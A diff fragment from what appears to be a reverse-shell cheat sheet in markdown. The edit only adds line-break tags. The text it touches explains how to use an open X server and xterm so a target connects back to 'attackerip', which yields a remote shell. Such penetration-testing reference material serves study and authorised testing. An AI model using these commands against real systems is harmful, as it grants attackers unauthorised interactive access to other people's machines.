@@ -100,16 +100,16 @@ Bash<br>
 <br>
 Authorize the target IP's connection to you:<br>
 <br>
-Run this OUTSIDE the Xnest:
+Run this OUTSIDE the Xnest:<br>
 ``` xterm -display 127.0.0.1:1 ``` 
 
-Run this INSIDE the spawned xterm on the open X Server
+Run this INSIDE the spawned xterm on the open X Server<br>
 ``` xhost +targetip ```
 
-Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:
+Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:<br>
 ``` xterm -display attackerip:1 ```
 <br>or<br>
-``` DISPLAY=attackerip:0 xterm ```
+``` DISPLAY=attackerip:0 xterm ```<br>
 It will try to connect back to you, attackerip, on TCP port 6001.<br>
 
 If the xterm path is not within the PATH environment variable, you need to specify its filepath. Solaris path example:<br>
